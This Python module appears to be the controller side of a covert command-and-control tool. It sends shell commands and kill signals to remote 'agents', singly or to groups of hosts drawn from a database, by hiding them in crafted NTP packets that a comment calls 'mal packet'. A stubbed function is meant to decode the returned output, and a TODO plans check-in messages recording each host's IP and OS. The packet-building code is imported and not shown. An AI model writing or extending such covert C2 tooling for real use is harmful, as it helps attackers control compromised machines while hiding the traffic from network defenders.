from transport import packets

def sendRefCMD(tsObj, destGroup, endpoint, refId):
    #send manual ping, expect resync back from agent
    #send refid kill, agent will clean up, status dead in db
    if destGroup == "agent":
        print(f"Sending {refId} to {endpoint}")

        iPacket = packets.IDPacket(endpoint, refId)
        iPacket.sendIdPacket()

    else:
        data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
        for ip in data:
            print(f"Sending {refId} to {ip[0]} ({endpoint})")

            iPacket = packets.IDPacket(ip, refId)
            iPacket.sendIdPacket()


#send command via NTP message, craft mal packet
def sendCMD(tsObj, cmd, destGroup, endpoint): #
    if destGroup == "agent": 
        print(f"Sending \"{cmd}\" to ({endpoint})")
        cPacket = packets.CommandPacket(endpoint, cmd)
        cPacket.sendCommandPacket()

    else:
        data = tsObj.getDBObj().pullSpecific(destGroup, endpoint)
        for ip in data:
            print(f"Sending \"{cmd}\" to {ip[0]} ({endpoint})")

            cPacket = packets.CommandPacket(ip, cmd)
            cPacket.sendCommandPacket()
        

def getCMDOutput():
    pass #command output is passed to this and then "decoded", then printed

    #TODO have an initial "ping" setup msg that populates the ip and os fields, add service as descriptor after